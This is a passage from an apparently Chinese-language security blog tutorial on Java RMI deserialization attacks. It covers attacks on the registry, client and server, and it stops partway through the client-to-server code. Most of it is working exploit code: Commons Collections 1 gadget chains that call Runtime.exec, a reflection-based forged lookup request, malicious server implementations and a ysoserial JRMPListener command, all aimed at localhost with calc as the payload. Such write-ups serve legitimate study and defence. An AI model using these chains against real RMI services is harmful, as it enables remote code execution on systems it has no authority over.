class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>  </span><br><span class="line">         , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">    &#125;;  </span><br><span class="line">         <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">         HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">         hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;drunkbaby&quot;</span>);  </span><br><span class="line">         Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">         <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">         <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">         aihConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">         <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  </span><br><span class="line">         <span class="keyword">return</span> o;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>rebind</code>攻击和<code>bind</code>攻击一样，只需要将<code>bind</code>替换为<code>rebind</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;test&quot;</span>,remote);</span><br></pre></td></tr></table></figure>

<h4 id="Evwbq">unbind/lookup攻击</h4>
根据前面的对应信息，我们找到两者对应的源码

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p><code>unbind</code>和<code>lookup</code>的攻击手法是一样的，我们这里用<code>lookup</code>来分析</p>
<p>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求利用，修改<code>lookup</code>方法，使其可以传入对象</p>
<p>我们想要修改<code>lookup</code>方法，就要知道它的内部原理</p>
<p>其实我们从try–catch结构来看，就知道哪里是重要代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var23;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var23 = (Remote)var6.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125;......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重要的代码有以下几条，这里我们重点看传输部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传输</span></span><br><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">var3.writeObject(var1);</span><br><span class="line"><span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收</span></span><br><span class="line"><span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">var23 = (Remote)var6.readObject();</span><br></pre></td></tr></table></figure>

<p>我们这里只需要想办法去获取<code>newCall</code>中的super.ref和operations，就能去伪造一个<code>lookup</code>请求</p>
<p>别的师傅通过反射来获取<code>operations</code>，我找到<code>operations</code>赋值地方，我这里直接用这个赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br></pre></td></tr></table></figure>

<p>通过调试，我找到了super.ref的地方（比较笨，只能通过调试来）</p>
<p>registry中的第一个属性</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741234993088-1f7624fe-41d6-4693-9dce-0bae89f29bc9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741234993088-1f7624fe-41d6-4693-9dce-0bae89f29bc9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>通过反射获取<code>Field</code>数组，从中找到<code>UnicastRef</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure>

<p>EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;drunkbaby&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741235203120-8fee3282-6d59-4544-929f-b65888540294.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741235203120-8fee3282-6d59-4544-929f-b65888540294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="m4BD5">攻击客户端</h3>

<p>我们之前分析过，在客户端中，在<code>unmarshalValue()</code>方法中，存在着入口</p>
<h4 id="HqfBW">注册中心攻击客户端</h4>
对于注册中心看，我们还是上面说的那几种方式触发

<p>除了<code>unbind</code>和<code>rebind</code>方法，都会返回数据给客户端，当序列化数据到了客户端时就会反序列化，我们需要控制注册中心返回的数据，就可以实现对客户端的攻击</p>
<p>我们使用ysoserial的JRMPListener，命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后使用客户端访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741236357004-9b8823fc-3f07-42cf-8edb-d410a8973acd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741236357004-9b8823fc-3f07-42cf-8edb-d410a8973acd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="CYWBr">服务端攻击客户端</h4>
服务端攻击客户端，通过 服务端返回Object对象 来攻击

<p>传递回来不一定是基础数据类型（String，int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要进行对应的反序列化操作。</p>
<p>我们需要伪造一个服务器，当客户端调用某个远程方法时，返回的参数是我们的恶意对象</p>
<p>服务端接口类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端接口实现类，返回CC1<code>Object</code>对象（这里不是很懂，对handler的封装是怎么个事）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Object) handler;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端创建注册中心并绑定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>用服务器对客户端进行远程方法的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj)registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741240065969-7dc13f4f-b314-4d7f-9d3c-862069ffdcec.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741240065969-7dc13f4f-b314-4d7f-9d3c-862069ffdcec.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="fKBWM">攻击服务端</h3>
<h4 id="WqRvB">客户端攻击服务端</h4>

<ul>
<li>jdk 1.7</li>
<li>CC3.2.1依赖</li>
<li>RMI提供的数据类型有Object类型</li>
</ul>
<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VictimServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span> &#123;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            <span class="built_in">super</span>();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了hello方法&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了evil方法，传递对象为：&quot;</span>+obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();  </span><br><span class="line"> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line"> Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VictimServer</span>().start();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Server.IRemoteHelloWorld;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> Server.IRemoteHelloWorld;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">r</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        r.evil(getpayload());</span><br><span class="line">    